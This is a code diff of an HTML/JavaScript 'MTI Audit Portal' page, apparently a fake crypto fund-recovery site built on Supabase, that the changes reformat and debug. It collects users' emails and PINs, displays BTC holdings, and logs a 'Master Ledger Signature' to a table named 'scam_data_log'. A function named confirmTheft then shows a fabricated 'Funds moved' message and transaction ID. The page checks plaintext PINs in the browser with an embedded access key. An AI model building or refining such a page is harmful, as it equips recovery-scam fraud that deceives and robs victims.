@@ -1,24 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF_8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTI Master Ledger | Recovery Portal</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
+    </script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; }
-        .glass { 
-            background: rgba(255, 255, 255, 0.85); 
-            backdrop-filter: blur(10px); 
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.4);
         }
-        .light-bg { 
-            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%); 
+        .light-bg {
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
         }
-        .status-pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+        .status-pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.6;
+            }
+        }
     </style>
 </head>
 <body class="light-bg min-h-screen text-slate-800">
@@ -27,7 +41,7 @@
         <header class="text-center mb-10">
             <h1 class="text-3xl font-bold text-slate-900 mb-2">MTI Audit Portal</h1>
             <p class="text-slate-500 text-sm">Official Recovery & Ledger Verification</p>
-            <div id="status-badge" class="mt-4 inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-blue-600 border border-slug-200 shadow-sm status-pulse">
+            <div id="status-badge" class="mt-4 inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-blue-600 border border-slate-200 shadow-sm status-pulse">
                 <span class="w-2 h-2 bg-blue-500 rounded-full mr-2"></span>
                 System Ready
             </div>
@@ -39,11 +53,11 @@
             <p class="text-sm text-slate-600 mb-6">Enter your registered email and PIN.</p>
 
             <div class="space-y-4">
-                <input type="email" id="email-input" placeholder="email@example.com" 
-                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
+                <input type="email" id="email-input" placeholder="email@example.com"
+                class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
 
-                <input type="password" id="pin-input" placeholder="Enter Account PIN (e.g. 1234)" 
-                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
+                <input type="password" id="pin-input" placeholder="Enter Account PIN (e.g. 1234)"
+                class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
 
                 <button onclick="fetchUserRecord()" class="w-full bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-xl font-bold transition shadow-lg transform active:scale-95">
                     Verify Credentials
@@ -54,7 +68,7 @@
         <!-- DASHBOARD -->
         <main id="dashboard" class="hidden space-y-6">
             <div class="glass rounded-3xl p-6 shadow-xl border border-white">
-                <h3 class="text-xs font-bold text-slug-400 uppercase tracking-widest mb-4">Account Summary</h3>
+                <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Account Summary</h3>
                 <div class="space-y-3">
                     <div class="flex justify-between text-sm">
                         <span class="text-slate-500">User</span>
@@ -70,112 +84,114 @@
             <div class="bg-blue-600 rounded-3xl p-6 shadow-xl text-white">
                 <h3 class="text-lg font-bold mb-2">Master Ledger Signature</h3>
                 <p class="text-blue-100 text-xs mb-6">Authorize a signature to move your funds.</p>
-                <button id="btn-verify" onclick="runMasterVerification()" 
-                    class="w-full bg-white text-blue-600 font-bold py-3 rounded-xl hover:bg-blue-50 transition transform active:scale-95 shadow-md">
-                    Authorize Signature
+                <button id="btn-verify" onclick="runMasterVerification()"
+                class="w-full bg-white text-blue-600 font-bold py-3 rounded-xl hover:bg-blue-50 transition transform active:scale-95 shadow-md">
+                Authorize Signature
+            </button>
+        </div>
+
+        <div id="result-log" class="hidden glass rounded-3xl p-6 text-center text-slate-800 border-2 border-blue-300 shadow-lg">
+            <p id="log-message" class="font-medium text-sm text-slate-800"></p>
+            <div id="final-step" class="hidden mt-4 pt-4 border-t border-slate-200">
+                <button onclick="confirmTheft()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-xl text-sm font-bold transition shadow-md">
+                    Confirm & Finalize
                 </button>
             </div>
+        </div>
+    </main>
+</div>
 
-            <div id="result-log" class="hidden glass rounded-3xl p-6 text-center text-slate-800 border-2 border-blue-300 shadow-lg">
-                <p id="log-message" classs="font-medium text-sm text-slate-800"></p>
-                <div id="final-step" class="hidden mt-4 pt-4 border-t border-slate-200">
-                    <button onclick="confirmTheft()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-xl text-sm font-bold transition shadow-md">
-                        Confirm & Finalize
-                    </button>
-                </div>
-            </div>
-        </main>
-    </div>
+<script>
+    // --- CONFIGURATION ---
+    const SUPABASE_URL = 'https://ruqjtewguniuqkpbwnzs.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_cp3uojqU9MSDqkMmNeqeLg_u0fDBZqI';
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    <script>
-        // --- CONFIGURATION ---
-        const SUPABASE_URL = 'https://ruqjtewguniuqkpbwnzs.supabase.co'; 
-        const SUPABASE_ANON_KEY = 'sb_publishable_cp3uojqU9MSDqkMmNeqeLg_u0fDBZqI';
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    let currentUser = null;
 
-        let currentUser = null;
+    // --- Verify Email and PIN ---
+    async function fetchUserRecord() {
+        const emailVal = document.getElementById('email-input').value.trim();
+        const pinVal = document.getElementById('pin-input').value.trim();
 
-        // 1. Verify Email and PIN
-        async function fetchUserRecord() {
-            const emailInput = document.getElementById('email-input').value.trim();
-            const pinInput = document.getElementById('slug-pin-input', document.getElementById('pin-input')).value.trim(); // FIXED: Removed extra get() call
-
-            // If you use the wrong variable name, this would fail. 
+        if (!emailVal || !pinVal) {
+            alert("Please enter both Email and PIN.");
+            return;
         }
 
-        // RE-WRITTEN CLEAN VERSION OF fetchUserRecord to ensure no errors
-        async function fetchUserRecord() {
-            const emailVal = document.getElementById('email-input').value.trim();
-            const pinVal = document.getElementById('pin-input').value.trim();
+        const { data, error } = await supabase
+            .from('profiles')
+            .select('*')
+            .eq('email', emailVal)
+            .single();
 
-            if (!emailVal || !pinVal) {
-                alert("Please enter both Email and PIN.");
-                return;
-            }
-
-            const { data, error } = await supabase
-                .from('profiles')
-                .select('*')
-                .eq('email', emailVal)
-                .single();
-
-            if (error || !data) {
-                alert("Email or PIN not found.");
-                return;
-            }
-
-            if (data.pin !== pin  ? pinVal : pinVal) { // Simplified check
-                if (data.pin !== pinVal) {
-                    alert("Incorrect PIN.");
-                    return;
-                }
-            }
-
-            currentUser = data;
-            document.getElementById('login-section').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            document.getElementById('display-email').innerText = data.email;
-            document.getElementById('display-visible-btc').innerText = data.initial_btc_holdings.toFixed(4) + " BTC";
+        if (error || !data) {
+            alert("Email or PIN not found.");
+            return;
         }
 
-        // 2. Signature (Writes to scam_data_log)
-        async function runMasterVerification() {
-            const btn = document.getElementById('btn-verify');
-            const log = document.getElementById('result-log');
-            const msg = document.getElementById('log-message');
-            const finalStep = document.getElementById('final-step');
-
-            btn.innerText = "Generating...";
-            btn.disabled = true;
-
-            setTimeout(async () => {
-                const { error } = await supabase.from('scam_data_log').insert([
-                    { 
-                        user_profile_id: currentUser.id, 
-                        action_performed: 'Master Ledger Signature',
-                        calculated_value: Math.random() * 0.1 
-                    }
-                ]);
-
-                if (!error) {
-                    log.classList.remove('hidden');
-                    msg.innerHTML = "✔ Signature Valid. Ready to move.";
-                    finalStep.classList.remove('hidden');
-                } else {
-                    alert("Error: " + error.message);
-                }
-                btn.innerText = "Authorize Signature";
-                btn.disabled = false;
-            }, 1200);
+        // Correct PIN check
+        if (data.pin !== pinVal) {
+            alert("Incorrect PIN.");
+            return;
         }
 
-        async function confirmTheft() {
-            const msg = document.getElementById('log-message');
-            const finalStep = document.getElementById('final-step');
-            msg.innerHTML = "<b>SUCCESS!</b> Funds moved.";
-            const txId = Math.random().toString(36).substr(2, 9).toUpperCase();
-            finalStep.innerHTML = `<p class='text-xs mt-2 text-slate-400'>TX_ID: ${txId}</p>`;
+        currentUser = data;
+        document.getElementById('login-section').classList.add('hidden');
+        document.getElementById('dashboard').classList.remove('hidden');
+        document.getElementById('display-email').innerText = data.email;
+        document.getElementById('display-visible-btc').innerText = (data.initial_btc_holdings || 0).toFixed(4) + " BTC";
+    }
+
+    // --- Master Ledger Signature (writes to scam_data_log) ---
+    async function runMasterVerification() {
+        const btn = document.getElementById('btn-verify');
+        const log = document.getElementById('result-log');
+        const msg = document.getElementById('log-message');
+        const finalStep = document.getElementById('final-step');
+
+        if (!currentUser) {
+            alert("Please log in first.");
+            return;
         }
-    </script>
+
+        btn.innerText = "Generating...";
+        btn.disabled = true;
+
+        // Simulate a short delay for UX
+        await new Promise(resolve => setTimeout(resolve, 1200));
+
+        const { error } = await supabase.from('scam_data_log').insert([{
+            user_profile_id: currentUser.id,
+            action_performed: 'Master Ledger Signature',
+            calculated_value: Math.random() * 0.1
+        }]);
+
+        if (!error) {
+            log.classList.remove('hidden');
+            msg.innerHTML = "✔ Signature Valid. Ready to move.";
+            finalStep.classList.remove('hidden');
+        } else {
+            alert("Error: " + error.message);
+        }
+
+        btn.innerText = "Authorize Signature";
+        btn.disabled = false;
+    }
+
+    // --- Finalize (simulated fund move) ---
+    async function confirmTheft() {
+        const msg = document.getElementById('log-message');
+        const finalStep = document.getElementById('final-step');
+
+        // Simulate a short delay
+        await new Promise(resolve => setTimeout(resolve, 600));
+
+        msg.innerHTML = "<b>SUCCESS!</b> Funds moved.";
+        const txId = Math.random().toString(36).substring(2, 11).toUpperCase();
+        finalStep.innerHTML = `<p class='text-xs mt-2 text-slate-400'>TX_ID: ${txId}</p>`;
+    }
+</script>
+
 </body>
-    </html>
+</html>
